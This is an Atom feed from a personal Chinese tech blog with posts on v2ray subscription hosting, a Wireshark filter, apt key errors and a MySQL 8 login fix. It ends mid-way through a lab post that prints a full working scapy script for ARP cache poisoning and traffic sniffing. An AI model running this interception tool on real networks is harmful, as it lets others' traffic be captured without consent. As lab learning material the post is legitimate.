<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>YouYang&#39;s Bay</title>
  
  <subtitle>个人学习日记</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://youyanglam.github.io/"/>
  <updated>2020-04-10T10:19:37.295Z</updated>
  <id>http://youyanglam.github.io/</id>
  
  <author>
    <name>YouYang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>v2ray订阅地址制作</title>
    <link href="http://youyanglam.github.io/2020/04/10/v2ray%E8%AE%A2%E9%98%85%E5%9C%B0%E5%9D%80%E5%88%B6%E4%BD%9C/"/>
    <id>http://youyanglam.github.io/2020/04/10/v2ray%E8%AE%A2%E9%98%85%E5%9C%B0%E5%9D%80%E5%88%B6%E4%BD%9C/</id>
    <published>2020-04-10T09:28:53.000Z</published>
    <updated>2020-04-10T10:19:37.295Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、index-html文件制作"><a href="#1、index-html文件制作" class="headerlink" title="1、index.html文件制作"></a>1、index.html文件制作</h3><p>将自己的vmess地址编码成base64字符串，保存为index.html</p><h3 id="2、搭建web站点"><a href="#2、搭建web站点" class="headerlink" title="2、搭建web站点"></a>2、搭建web站点</h3><p>这里以ubuntu服务器上安装lamp为例说明</p><h4 id="2-1、安装lamp"><a href="#2-1、安装lamp" class="headerlink" title="2.1、安装lamp"></a>2.1、安装lamp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install lamp-server^</span><br></pre></td></tr></table></figure><p>出现错误（apache服务器启动失败）</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@hwsrv-623577:~<span class="comment"># /etc/init.d/apache2 start</span></span><br><span class="line">[....] Starting apache2 (via systemctl): apache2.serviceJob <span class="keyword">for</span> apache2.service failed because the control process exited with error code.</span><br><span class="line">See <span class="string">"systemctl status apache2.service"</span> and <span class="string">"journalctl -xe"</span> <span class="keyword">for</span> details.</span><br><span class="line"> failed!</span><br><span class="line">root@hwsrv-623577:~<span class="comment"># systemctl status apache2.service</span></span><br><span class="line">● apache2.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor preset: enabled)</span><br><span class="line">  Drop-In: /lib/systemd/system/apache2.service.d</span><br><span class="line">           └─apache2-systemd.conf</span><br><span class="line">   Active: failed (Result: <span class="built_in">exit</span>-code) since Fri 2020-04-10 14:41:47 CST; 3min 30s ago</span><br><span class="line">  Process: 30938 ExecStart=/usr/sbin/apachectl start (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: (98)Address already <span class="keyword">in</span> use: AH00072: make_sock: could no</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: (98)Address already <span class="keyword">in</span> use: AH00072: make_sock: could no</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: no listening sockets available, shutting down</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: AH00015: Unable to open logs</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: Action <span class="string">'start'</span> failed.</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: The Apache error <span class="built_in">log</span> may have more information.</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: apache2.service: Control process exited, code=exited status=1</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: apache2.service: Failed with result <span class="string">'exit-code'</span>.</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: Failed to start The Apache HTTP Server.</span><br></pre></td></tr></table></figure><p>说明80端口被用<br>终端：  ps -ef|grep httpd察看占用的进程或者用netstat -lnp|grep 80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hwsrv-623577:~<span class="comment"># netstat -lnp|grep 80</span></span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      740/v2ray</span><br></pre></td></tr></table></figure><p>这是因为我vps上v2ray服务占用了80端口<br>将apache2的默认端口修改成8080</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/ports.conf</span><br><span class="line">listen 8080</span><br></pre></td></tr></table></figure><p>启动apache2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure><h4 id="2-2、替换index-html"><a href="#2-2、替换index-html" class="headerlink" title="2.2、替换index.html"></a>2.2、替换index.html</h4><p>web站点搭建好后，用上面的index.html文件替换掉默认的index.html文件（web目录为/var/www）</p><h3 id="3、配置订阅"><a href="#3、配置订阅" class="headerlink" title="3、配置订阅"></a>3、配置订阅</h3><p>将站点地址填入代理app(小火箭等)的订阅地址中<br>(因为v2ray的vmss协议官方没规定格式，所以v2rayN和quantumult的格式不一样，使用如下网页工具<br><a href="https://quan.eicky.com/" target="_blank" rel="noopener">https://quan.eicky.com/</a><br>可以将v2ray的vmess转换为Quantumult_Vmess)</p><h3 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h3><p><a href="https://yangwenqing.com/archives/748/" target="_blank" rel="noopener">https://yangwenqing.com/archives/748/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、index-html文件制作&quot;&gt;&lt;a href=&quot;#1、index-html文件制作&quot; class=&quot;headerlink&quot; title=&quot;1、index.html文件制作&quot;&gt;&lt;/a&gt;1、index.html文件制作&lt;/h3&gt;&lt;p&gt;将自己的vmess地址编码成base64字符串，保存为index.html&lt;/p&gt;&lt;h3 id=&quot;2、搭建web站点&quot;&gt;&lt;a href=&quot;#2、搭建web站点&quot; class=&quot;headerlink&quot; title=&quot;2、搭建web站点&quot;&gt;&lt;/a&gt;2、搭建web站点&lt;/h3&gt;&lt;p&gt;这里以ubuntu服务器上安装lamp为例说明&lt;/p&gt;&lt;h4 id=&quot;2-1、安装lamp&quot;&gt;&lt;a href=&quot;#2-1、安装lamp&quot; class=&quot;headerlink&quot; title=&quot;2.1、安装lamp&quot;&gt;&lt;/a&gt;2.1、安装lamp&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get update&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install lamp-server^&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;出现错误（apache服务器启动失败）&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="http://youyanglam.github.io/categories/web/"/>
    
    
      <category term="v2ray" scheme="http://youyanglam.github.io/tags/v2ray/"/>
    
  </entry>
  
  <entry>
    <title>wireshark过滤规则</title>
    <link href="http://youyanglam.github.io/2020/03/06/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/"/>
    <id>http://youyanglam.github.io/2020/03/06/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/</id>
    <published>2020-03-06T10:01:02.000Z</published>
    <updated>2020-03-06T13:48:55.717Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、http返回状态码过滤"><a href="#1、http返回状态码过滤" class="headerlink" title="1、http返回状态码过滤"></a>1、http返回状态码过滤</h3><p>http.response.code==302</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、http返回状态码过滤&quot;&gt;&lt;a href=&quot;#1、http返回状态码过滤&quot; class=&quot;headerlink&quot; title=&quot;1、http返回状态码过滤&quot;&gt;&lt;/a&gt;1、http返回状态码过滤&lt;/h3&gt;&lt;p&gt;http.response.code==302&lt;/p
      
    
    </summary>
    
    
      <category term="抓包" scheme="http://youyanglam.github.io/categories/%E6%8A%93%E5%8C%85/"/>
    
    
      <category term="wireshark" scheme="http://youyanglam.github.io/tags/wireshark/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu apt-get update NO_PUBKEY</title>
    <link href="http://youyanglam.github.io/2020/03/05/ubuntu-apt-get-update-NO-PUBKEY/"/>
    <id>http://youyanglam.github.io/2020/03/05/ubuntu-apt-get-update-NO-PUBKEY/</id>
    <published>2020-03-05T02:19:33.000Z</published>
    <updated>2020-03-05T02:24:31.697Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、错误描述"><a href="#1、错误描述" class="headerlink" title="1、错误描述"></a>1、错误描述</h3><p>sudo apt-get update,出现如下错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://dl.google.com/linux/chrome/deb stable Release: The following signatures couldn<span class="string">'t be verified because the public key is not available: NO_PUBKEY 78BD65473CB3BD13</span></span><br><span class="line"><span class="string">W: Failed to fetch http://dl.google.com/linux/chrome/deb/dists/stable/Release.gpg  The following signatures couldn'</span>t be verified because the public key is not available: NO_PUBKEY 78BD65473CB3BD13</span><br><span class="line">W: Some index files failed to download. They have been ignored, or old ones used instead.</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="2、解决方法"><a href="#2、解决方法" class="headerlink" title="2、解决方法"></a>2、解决方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --refresh-keys --keyserver keyserver.ubuntu.com</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、错误描述&quot;&gt;&lt;a href=&quot;#1、错误描述&quot; class=&quot;headerlink&quot; title=&quot;1、错误描述&quot;&gt;&lt;/a&gt;1、错误描述&lt;/h3&gt;&lt;p&gt;sudo apt-get update,出现如下错误&lt;/p&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://dl.google.com/linux/chrome/deb stable Release: The following signatures couldn&lt;span class=&quot;string&quot;&gt;&#39;t be verified because the public key is not available: NO_PUBKEY 78BD65473CB3BD13&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;W: Failed to fetch http://dl.google.com/linux/chrome/deb/dists/stable/Release.gpg  The following signatures couldn&#39;&lt;/span&gt;t be verified because the public key is not available: NO_PUBKEY 78BD65473CB3BD13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;W: Some index files failed to download. They have been ignored, or old ones used instead.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="linux" scheme="http://youyanglam.github.io/categories/linux/"/>
    
    
      <category term="ubuntu" scheme="http://youyanglam.github.io/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>phpMyAdmin连接MySQL8.0报错2054</title>
    <link href="http://youyanglam.github.io/2020/03/04/phpMyAdmin%E8%BF%9E%E6%8E%A5MySQL8-0%E6%8A%A5%E9%94%992054/"/>
    <id>http://youyanglam.github.io/2020/03/04/phpMyAdmin%E8%BF%9E%E6%8E%A5MySQL8-0%E6%8A%A5%E9%94%992054/</id>
    <published>2020-03-04T15:26:01.000Z</published>
    <updated>2020-03-04T15:42:55.973Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、报错场景"><a href="#1、报错场景" class="headerlink" title="1、报错场景"></a>1、报错场景</h3><p>在正确输入了MySQL用户名和密码后，phpMyAdmin连接MySQL8.0报错2054，无法登录MySQL服务器</p><h3 id="2、报错原因"><a href="#2、报错原因" class="headerlink" title="2、报错原因"></a>2、报错原因</h3><p>由于mysql8.0默认使用了新的密码验证插件<font color="red" size="4">caching_sha2_password</font>，而之前的PHP版本中所带的mysqlnd不能支持新的验证方式。</p><h3 id="3、解决方法"><a href="#3、解决方法" class="headerlink" title="3、解决方法"></a>3、解决方法</h3><a id="more"></a><p>删除创建的用户和授权</p><h4 id="3-1、查看当前的密码验证方式"><a href="#3-1、查看当前的密码验证方式" class="headerlink" title="3.1、查看当前的密码验证方式"></a>3.1、查看当前的密码验证方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; select User,plugin from user <span class="built_in">where</span> User = <span class="string">'root'</span>;</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| User | plugin                |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| root | caching_sha2_password |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure><h4 id="3-2、修改验证方式"><a href="#3-2、修改验证方式" class="headerlink" title="3.2、修改验证方式"></a>3.2、修改验证方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br><span class="line">use mysql;</span><br><span class="line">ALTER USER <span class="string">'root'</span>@<span class="string">'localhost'</span> IDENTIFIED WITH mysql_native_password BY <span class="string">'你的密码'</span>;</span><br></pre></td></tr></table></figure><h4 id="3-3、查看当前的密码验证方式"><a href="#3-3、查看当前的密码验证方式" class="headerlink" title="3.3、查看当前的密码验证方式"></a>3.3、查看当前的密码验证方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; select User,plugin from user <span class="built_in">where</span> User = <span class="string">'root'</span>;</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| User | plugin                |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| root | mysql_native_password |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、报错场景&quot;&gt;&lt;a href=&quot;#1、报错场景&quot; class=&quot;headerlink&quot; title=&quot;1、报错场景&quot;&gt;&lt;/a&gt;1、报错场景&lt;/h3&gt;&lt;p&gt;在正确输入了MySQL用户名和密码后，phpMyAdmin连接MySQL8.0报错2054，无法登录MySQL服务器&lt;/p&gt;&lt;h3 id=&quot;2、报错原因&quot;&gt;&lt;a href=&quot;#2、报错原因&quot; class=&quot;headerlink&quot; title=&quot;2、报错原因&quot;&gt;&lt;/a&gt;2、报错原因&lt;/h3&gt;&lt;p&gt;由于mysql8.0默认使用了新的密码验证插件&lt;font color=&quot;red&quot; size=&quot;4&quot;&gt;caching_sha2_password&lt;/font&gt;，而之前的PHP版本中所带的mysqlnd不能支持新的验证方式。&lt;/p&gt;&lt;h3 id=&quot;3、解决方法&quot;&gt;&lt;a href=&quot;#3、解决方法&quot; class=&quot;headerlink&quot; title=&quot;3、解决方法&quot;&gt;&lt;/a&gt;3、解决方法&lt;/h3&gt;
    
    </summary>
    
    
      <category term="mysql" scheme="http://youyanglam.github.io/categories/mysql/"/>
    
    
      <category term="phpMyAdmin" scheme="http://youyanglam.github.io/tags/phpMyAdmin/"/>
    
  </entry>
  
  <entry>
    <title>利用scapy进行arp缓存投毒</title>
    <link href="http://youyanglam.github.io/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/"/>
    <id>http://youyanglam.github.io/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/</id>
    <published>2020-03-01T09:50:52.000Z</published>
    <updated>2020-03-01T14:51:29.289Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、目标机和kali的网络信息"><a href="#1、目标机和kali的网络信息" class="headerlink" title="1、目标机和kali的网络信息"></a>1、目标机和kali的网络信息</h3><p>目标机ip信息：<br><img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/target.png" width="70%" height="70%"><br>目标机arp表信息<br><img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/arp.png" width="70%" height="70%"><br>kali ip信息<br><img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/kali.png" width="70%" height="70%"><br>kali arp表<br><img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/arpkali.png" width="70%" height="70%"></p><h3 id="2、编写python脚本进行arp投毒"><a href="#2、编写python脚本进行arp投毒" class="headerlink" title="2、编写python脚本进行arp投毒"></a>2、编写python脚本进行arp投毒</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment"># @File    : arper.py</span></span><br><span class="line"><span class="comment"># @Time    : 2/17/20 09:24</span></span><br><span class="line"><span class="comment"># @Author  : youyang</span></span><br><span class="line"><span class="comment"># @Site    : youyang.me</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_interface</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> platform</span><br><span class="line">    <span class="keyword">global</span> interface</span><br><span class="line">    sysstr = platform.system()</span><br><span class="line">    <span class="keyword">if</span> sysstr == <span class="string">"Linux"</span>:</span><br><span class="line">        interface = <span class="string">"eth0"</span></span><br><span class="line">    <span class="keyword">elif</span> sysstr == <span class="string">"Darwin"</span>:</span><br><span class="line">        interface = <span class="string">"en0"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        interface = <span class="string">"Ethernet0"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Setting up %s"</span> % interface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mac</span><span class="params">(ip_address)</span>:</span></span><br><span class="line">    responses, unanswered = srp(Ether(dst=<span class="string">'ff:ff:ff:ff:ff:ff'</span>) / ARP(pdst=ip_address), timeout=<span class="number">2</span>, retry=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 返回从响应数据中获取的MAC地址</span></span><br><span class="line">    <span class="keyword">for</span> s, r <span class="keyword">in</span> responses:</span><br><span class="line">        <span class="keyword">return</span> r[Ether].src</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poison_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    poison_target = ARP()</span><br><span class="line">    poison_target.op = <span class="number">2</span></span><br><span class="line">    poison_target.psrc = gateway_ip</span><br><span class="line">    poison_target.pdst = target_ip</span><br><span class="line">    poison_target.hwdst = target_mac</span><br><span class="line"></span><br><span class="line">    poison_gateway = ARP()</span><br><span class="line">    poison_gateway.op = <span class="number">2</span></span><br><span class="line">    poison_gateway.psrc = target_ip</span><br><span class="line">    poison_gateway.pdst = gateway_ip</span><br><span class="line">    poison_gateway.hwdst = gateway_mac</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Beginning the ARP poison. [CTRL-C to stop]"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            send(poison_target)</span><br><span class="line">            send(poison_gateway)</span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] ARP poison attack finished."</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_target</span><span class="params">(gateway_ip, gateway_mac, target_ip, target_mac)</span>:</span></span><br><span class="line">    <span class="comment"># 以下代码中调用send函数的方式稍有不同</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Restoring target..."</span></span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=gateway_ip, pdst=target_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=gateway_mac), count=<span class="number">5</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, psrc=target_ip, pdst=gateway_ip, hwdst=<span class="string">"ff:ff:ff:ff:ff:ff"</span>, hwsrc=target_mac), count=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发出退出信号到主线程</span></span><br><span class="line">    os.kill(os.getpid(), signal.SIGINT)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_current_time</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    <span class="keyword">return</span> time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>,time.localtime(time.time()))</span><br><span class="line"></span><br><span class="line">target_ip = <span class="string">"172.16.244.128"</span></span><br><span class="line">gateway_ip = <span class="string">"172.16.244.2"</span></span><br><span class="line">packet_count = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置网络接口</span></span><br><span class="line">interface = <span class="string">""</span></span><br><span class="line">set_interface()</span><br><span class="line">conf.iface = interface</span><br><span class="line">conf.verb = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获得网关和目标ip对应的mac</span></span><br><span class="line">gateway_mac = get_mac(gateway_ip)</span><br><span class="line"><span class="keyword">if</span> gateway_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!!!] Failed to get gateway MAC. Exiting."</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Gateway %s is at %s"</span> % (gateway_ip, gateway_mac)</span><br><span class="line"></span><br><span class="line">target_mac = get_mac(target_ip)</span><br><span class="line"><span class="keyword">if</span> target_mac <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[!!!] Failed to get target MAC. Exiting."</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Target %s is at %s"</span> % (target_ip, target_mac)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动arp投毒线程</span></span><br><span class="line">poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))</span><br><span class="line">poison_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[*] Starting sniffer for %d packets"</span> % packet_count</span><br><span class="line">    bpf_filter = <span class="string">"ip host %s"</span> % target_ip</span><br><span class="line">    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)</span><br><span class="line">    <span class="comment"># 将捕获到的数据包输出到文件</span></span><br><span class="line">    wrpcap(<span class="string">'arper'</span>+get_current_time()+<span class="string">'pcap'</span>, packets)</span><br><span class="line">    <span class="comment"># 还原网络配置</span></span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="comment"># 还原网络配置</span></span><br><span class="line">    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><p>执行脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td 